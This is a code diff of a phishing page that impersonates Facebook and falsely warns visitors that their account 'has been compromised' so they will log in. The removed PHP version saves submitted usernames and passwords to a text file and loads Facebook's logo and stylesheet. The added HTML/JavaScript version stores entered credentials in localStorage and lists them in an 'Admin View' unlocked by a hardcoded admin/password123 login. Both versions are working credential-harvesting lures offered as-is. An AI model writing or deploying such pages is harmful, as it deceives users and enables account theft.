@@ -1,124 +1,119 @@
-<?php
-// Create a file to store the login credentials
-$filename = 'credentials.txt';
-
-// Check if the file exists
-if (file_exists($filename)) {
-    // Read the contents of the file
-    $credentials = file_get_contents($filename);
-} else {
-    // Create the file if it doesn't exist
-    $fp = fopen($filename, 'w');
-    fwrite($fp, '');
-    fclose($fp);
-}
-
-// Function to store the login credentials
-function store_credentials($username, $password) {
-    global $filename;
-    $fp = fopen($filename, 'a');
-    fwrite($fp, "Username: $username, Password: $password\n");
-    fclose($fp);
-}
-
-// Call the function to store the credentials
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-    store_credentials($username, $password);
-}
-
-// Admin authentication
-$admin_username = 'admin';
-$admin_password = 'password123';
-
-if (isset($_POST['admin_username']) && isset($_POST['admin_password'])) {
-    if ($_POST['admin_username'] == $admin_username && $_POST['admin_password'] == $admin_password) {
-        header('Location: admin.php');
-        exit;
-    }
-}
-?>
-
 <!DOCTYPE html>
 <html>
 <head>
-  <title>⚠️ Login to Secure Your Account</title>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/2KFbYqZQk5X.css?_nc_revision=0" rel="stylesheet" id="u_0_d_rD" crossorigin="anonymous" />
-  <style>
-    body {
-      background-color: #f0f2f5;
-      font-family: 'Helvetica', sans-serif;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .container {
-      background-color: #ffffff;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      padding: 40px;
-      width: 400px;
-      max-width: 90%;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 15px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      margin-bottom: 15px;
-      box-sizing: border-box;
-    }
-
-    input[type="submit"] {
-      background-color: #1877f2;
-      color: #ffffff;
-      padding: 15px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    input[type="submit"]:hover {
-      background-color: #166fe5;
-    }
-
-    .facebook-logo {
-      width: 100%;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .facebook-logo img {
-      width: 100px;
-      height: 100px;
-    }
-  </style>
+	<title>Login to Secure your account</title>
+	<style>
+		body {
+			background-color: #f0f2f5; /* Facebook's background color */
+			font-family: Arial, sans-serif;
+		}
+		.container {
+			width: 400px;
+			margin: 50px auto;
+			background-color: #fff; /* White background */
+			padding: 20px;
+			border: 1px solid #ddd;
+			border-radius: 10px;
+			box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+		}
+		.warning {
+			background-color: #ff9900; /* Orange warning color */
+			color: #fff;
+			padding: 10px;
+			border-radius: 10px;
+			margin-bottom: 20px;
+		}
+		.form {
+			margin-top: 20px;
+		}
+		.form input[type="text"], .form input[type="password"] {
+			width: calc(100% - 22px); /* Balanced width */
+			height: 40px;
+			margin-bottom: 20px;
+			padding: 10px;
+			border: 1px solid #ccc;
+			border-radius: 5px;
+		}
+		.form input[type="submit"] {
+			width: 100%;
+			height: 40px;
+			background-color: #4267B2; /* Facebook's blue button color */
+			color: #fff;
+			padding: 10px;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+		}
+		.form input[type="submit"]:hover {
+			background-color: #365899; /* Facebook's blue button hover color */
+		}
+		.admin-view {
+			display: none;
+		}
+		input::placeholder { /* Blue placeholder text */
+			color: #90949c; /* Facebook's placeholder text color */
+		}
+	</style>
 </head>
 <body>
-  <div class="container">
-    <div class="facebook-logo">
-      <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/2KFbYqZQk5X.png?_nc_revision=0" alt="Facebook Logo">
-    </div>
-    <h2>⚠️ Login to Secure Your Account</h2>
-    <p style="color: red; font-size: 14px;">Your account has been compromised. Please login to secure your account.</p>
-    <form action="" method="post">
-      <input type="text" name="username" placeholder="Email address or phone number">
-      <input type="password" name="password" placeholder="Password">
-      <input type="submit" value="Log In">
-    </form>
-  </div>
+	<div class="container">
+		<div class="warning">
+			<h2>Warning: Your account has been compromised!</h2>
+			<p>Please login to secure your account.</p>
+		</div>
+		<form class="form" id="login-form">
+			<input type="text" name="username" placeholder="Username">
+			<input type="password" name="password" placeholder="Password">
+			<input type="submit" value="Login">
+		</form>
+		<div class="admin-view" id="admin-view">
+			<h2>Admin View</h2>
+			<ul id="credentials-list"></ul>
+		</div>
+	</div>
+	
+	<script>
+		const form = document.getElementById('login-form');
+		const adminView = document.getElementById('admin-view');
+		const usernameInput = document.querySelector('input[name="username"]');
+		const passwordInput = document.querySelector('input[name="password"]');
+		const credentialsList = document.getElementById('credentials-list');
+
+		// Load credentials from localStorage
+		function loadCredentials() {
+			credentialsList.innerHTML = ''; // Clear the list
+			for (let i = 0; i < localStorage.length; i++) {
+				let username = localStorage.key(i);
+				let password = localStorage.getItem(username);
+				addCredentialToView(username, password); 
+			}
+		}
+
+		// Add credential to view
+		function addCredentialToView(username, password) {
+			let li = document.createElement('li');
+			li.textContent = `${username}: ${password}`;
+			credentialsList.appendChild(li);
+		}
+
+		form.addEventListener('submit', (e) => {
+			e.preventDefault();
+			const username = usernameInput.value;
+			const password = passwordInput.value;
+
+			if (username === 'admin' && password === 'password123') {
+				adminView.style.display = 'block';
+				loadCredentials();
+			} else {
+				// Store credentials in localStorage
+				localStorage.setItem(username, password);
+				addCredentialToView(username, password);
+				adminView.style.display = 'block';
+			}
+		});
+
+		// Initial loading of credentials
+		loadCredentials(); 
+	</script>
 </body>
 </html>
